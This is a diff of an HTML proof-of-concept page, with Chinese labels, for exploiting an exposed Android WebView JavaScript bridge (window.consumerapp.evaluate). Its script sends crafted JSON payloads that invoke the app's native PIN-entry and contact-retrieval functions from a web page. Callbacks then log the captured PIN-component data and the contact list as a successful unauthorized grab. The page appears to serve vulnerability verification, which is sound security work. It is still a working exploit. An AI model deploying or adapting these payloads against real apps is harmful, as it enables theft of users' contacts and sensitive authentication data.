@@ -2,53 +2,204 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JS Bridge 漏洞验证 (PoC)</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>JS Bridge 敏感接口暴露验证 (PoC)</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; }
-        button { width: 100%; padding: 15px; margin: 10px 0; background-color: #ff4d4f; color: white; border: none; border-radius: 5px; font-size: 16px; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 15px;
+            color: #333;
+        }
+        .header {
+            background-color: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        h2 {
+            margin-top: 0;
+            color: #111;
+            font-size: 20px;
+            border-bottom: 2px solid #ff5722;
+            padding-bottom: 8px;
+        }
+        .url-box {
+            word-break: break-all;
+            background: #eaeaea;
+            padding: 8px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 12px;
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 12px;
+            background-color: #ff5252;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .btn:active {
+            background-color: #e53935;
+        }
+        .log-container {
+            background-color: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            margin-top: 15px;
+        }
+        h3 {
+            margin-top: 0;
+            font-size: 16px;
+        }
+        #log {
+            background-color: #f8f9fa;
+            border: 1px solid #e0e0e0;
+            border-radius: 6px;
+            padding: 10px;
+            font-family: monospace;
+            font-size: 13px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            min-height: 150px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
     </style>
 </head>
 <body>
 
-    <h2>JS Bridge 敏感接口暴露验证</h2>
-    <p>当前页面域名: <script>document.write(window.location.href);</script></p>
-    
-    <button onclick="testTriggerPin()">1. 尝试触发 PIN 码输入弹窗</button>
-    <button onclick="testObtainContact()">2. 尝试获取通讯录</button>
+    <div class="header">
+        <h2>JS Bridge 敏感接口暴露验证</h2>
+        <p style="font-size: 14px; margin: 5px 0;">当前页面域名:</p>
+        <div class="url-box" id="current-url">加载中...</div>
+    </div>
 
-    <hr>
-    <h3>日志输出:</h3>
-    <div id="log" style="background: #f5f5f5; padding: 10px; border-radius: 5px; min-height: 100px; white-space: pre-wrap;"></div>
+    <button class="btn" onclick="triggerAndroidPinVulnerability()">1. 尝试触发 Android PIN 码输入弹窗</button>
+    <button class="btn" style="background-color: #ff9800;" onclick="triggerAndroidContactVulnerability()">2. 尝试越权获取 Android 通讯录</button>
+
+    <div class="log-container">
+        <h3>日志输出:</h3>
+        <div id="log">[*] 页面初始化完成，正在等待检测 JS Bridge...</div>
+    </div>
 
     <script>
-function testAndroidPin() {
-    if (window.consumerapp && typeof window.consumerapp.evaluate === 'function') {
-        showLog("[*] 正在尝试触发 Android PIN 码功能的精准 Payload...");
-        
-        // 尝试两端最通用的常量字符串值
-        const targetFunctions = ["kWebRequestPin", "requestPin"];
-        
-        targetFunctions.forEach(funcName => {
-            const payload = {
-                "functionName": funcName,
-                "functionCallBackName": "myPinSuccessCallback", // 同级传递，供底层解析器提取
-                "params": {
-                    // 底层 RequestPin 显式要求 params 内必须能读到它，双重保险
-                    "functionCallBackName": "myPinSuccessCallback", 
-                    "reason": "PoC测试"
-                }
-            };
-            
-            window.consumerapp.evaluate(JSON.stringify(payload));
-        });
-        
-        showLog("[+] 请求已发送，若常量对齐，手机将进入 gotoEnterPin() 逻辑。");
-    }
-}
+        // 显示当前完整的 URL 包含参数，便于核对
+        document.getElementById('current-url').innerText = window.location.href;
 
-window.myPinSuccessCallback = function(res) {
-    showLog("[🔥 成功捕获 PIN 码组件返回]: " + JSON.stringify(res));
-};    </script>
+        // 通用日志打印函数
+        function showLog(message) {
+            const logDiv = document.getElementById('log');
+            logDiv.innerText += "\n" + message;
+            logDiv.scrollTop = logDiv.scrollHeight; 
+        }
+
+        // 页面加载自动探测 Bridge 基础状态
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => {
+                const bridge = window.consumerapp;
+                if (bridge) {
+                    showLog("[+] 成功检测到开放的 JS Bridge 对象: window.consumerapp");
+                    if (typeof bridge.evaluate === 'function') {
+                        showLog("[+] 核心路由函数 window.consumerapp.evaluate 可用");
+                    } else {
+                        showLog("[-] 警告: window.consumerapp 存在，但未找到 evaluate 方法");
+                    }
+                } else {
+                    showLog("[-] 未检测到 window.consumerapp 对象，请确认是否在目标 App WebView 内打开");
+                }
+            }, 800);
+        });
+
+        /**
+         * 验证一：触发 Android 原生 PIN 码弹窗流程
+         */
+        function triggerAndroidPinVulnerability() {
+            try {
+                if (window.consumerapp && typeof window.consumerapp.evaluate === 'function') {
+                    showLog("[*] 正在向 Android 发送针对 RequestPin.java 构造的精准 Payload...");
+                    
+                    const payload = {
+                        "functionName": "js_fun_request_pin", 
+                        "functionCallBackName": "onPinCaptured", 
+                        "params": {
+                            "functionCallBackName": "onPinCaptured",
+                            "reason": "Security Compliance Exploit Test"
+                        }
+                    };
+                    
+                    const jsonString = JSON.stringify(payload);
+                    showLog("[*] 投喂的 PIN Payload 字符串为:\n" + jsonString);
+                    
+                    window.consumerapp.evaluate(jsonString);
+                    showLog("[+] Payload 已送达，请观察手机是否进入原生 gotoEnterPin() 界面。");
+                } else {
+                    showLog("[-] 调用失败: window.consumerapp.evaluate 接口不可用");
+                }
+            } catch (e) {
+                showLog("[-] JS 执行异常: " + e.message);
+            }
+        }
+
+        /**
+         * 验证二：触发 Android 原生通讯录获取流程（已对齐精准常量）
+         */
+        function triggerAndroidContactVulnerability() {
+            try {
+                if (window.consumerapp && typeof window.consumerapp.evaluate === 'function') {
+                    showLog("[*] 正在发送针对通讯录组件构造的精准 Payload...");
+                    
+                    const payload = {
+                        // 严格匹配底层常量 WebViewConstants.JS_FUN_OBTAIN_CONTACT 的真实字符串
+                        "functionName": "js_fun_getContactPhoneNumber", 
+                        "functionCallBackName": "onContactCaptured",
+                        "params": {
+                            // 按照架构防护惯例，在 params 中同样强行注入回调函数名，防止底层因空值 return
+                            "functionCallBackName": "onContactCaptured"
+                        }
+                    };
+                    
+                    const jsonString = JSON.stringify(payload);
+                    showLog("[*] 投喂的通讯录 Payload 字符串为:\n" + jsonString);
+                    
+                    window.consumerapp.evaluate(jsonString);
+                    showLog("[+] Payload 已送达，请查看手机端是否触发通讯录选择列表或请求权限。");
+                } else {
+                    showLog("[-] 调用失败: window.consumerapp.evaluate 接口不可用");
+                }
+            } catch (e) {
+                showLog("[-] JS 执行异常: " + e.message);
+            }
+        }
+
+        /**
+         * 异步全局回调：用于捕获并显示 App 原生端越权吐回的数据
+         */
+        window.onPinCaptured = function(result) {
+            showLog("\n========================================");
+            showLog("[🔥 漏洞成功复现！捕获到 PIN 码组件返回数据]:");
+            showLog(JSON.stringify(result, null, 2));
+            showLog("========================================");
+        };
+
+        window.onContactCaptured = function(result) {
+            showLog("\n========================================");
+            showLog("[🔥 漏洞成功复现！成功越权抓取通讯录数据]:");
+            showLog(JSON.stringify(result, null, 2));
+            showLog("========================================");
+        };
+
+    </script>
 </body>
 </html>
